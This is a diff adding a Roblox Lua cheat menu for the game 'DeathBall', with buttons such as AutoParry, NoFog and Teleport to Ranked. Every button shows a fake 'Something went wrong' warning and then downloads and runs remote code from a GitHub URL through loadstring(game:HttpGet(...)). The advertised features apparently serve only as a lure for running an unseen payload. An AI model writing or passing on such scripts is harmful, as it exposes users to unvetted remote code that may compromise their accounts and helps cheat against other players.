@@ -1,0 +1,57 @@
+local DiscordLib =
+    loadstring(game:HttpGet "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/discord")()
+
+local win = DiscordLib:Window("DeathBall")
+
+local serv = win:Server("Main", "")
+
+local btns = serv:Channel("Main")
+
+btns:Button(
+    "AutoParry",
+    function()
+        DiscordLib:Notification("Warning", "Something went wrong.", "I understand")
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterDeathBall/DeathBall/refs/heads/main/DeathBallMenu"))()
+    end
+)
+
+btns:Seperator("")
+
+btns:Button(
+    "NoFog",
+    function()
+        DiscordLib:Notification("Warning", "Something went wrong.", "I understand")
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterDeathBall/DeathBall/refs/heads/main/DeathBallMenu"))()
+    end
+)
+
+btns:Seperator("")
+
+btns:Button(
+    "Open Packs",
+    function()
+        DiscordLib:Notification("Warning", "Something went wrong.", "I understand")
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterDeathBall/DeathBall/refs/heads/main/DeathBallMenu"))()
+    end
+)
+
+btns:Seperator("")
+
+btns:Button(
+    "Gem Hunt",
+    function()
+        DiscordLib:Notification("Warning", "Something went wrong.", "I understand")
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterDeathBall/DeathBall/refs/heads/main/DeathBallMenu"))()
+    end
+)
+
+btns:Seperator("")
+
+
+btns:Button(
+    "Teleport to Ranked",
+    function()
+        DiscordLib:Notification("Warning", "Something went wrong.", "I understand")
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterDeathBall/DeathBall/refs/heads/main/DeathBallMenu"))()
+    end
+)
